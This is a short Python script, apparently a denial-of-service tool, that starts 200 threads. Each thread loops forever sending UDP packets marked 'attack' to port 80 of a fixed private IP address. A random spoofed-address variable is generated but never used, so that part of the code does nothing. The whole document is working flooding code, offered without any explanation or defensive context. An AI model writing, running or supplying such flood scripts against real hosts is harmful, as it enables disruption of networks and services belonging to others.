import socket
import threading
import random

TARGET_IP = "192.168.1.7"
PORT = 80

def attack():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        fake_ip = f"192.168.1.{random.randint(2,254)}"
        sock.sendto(b"attack", (TARGET_IP, PORT))

for i in range(200):
    threading.Thread(target=attack).start()
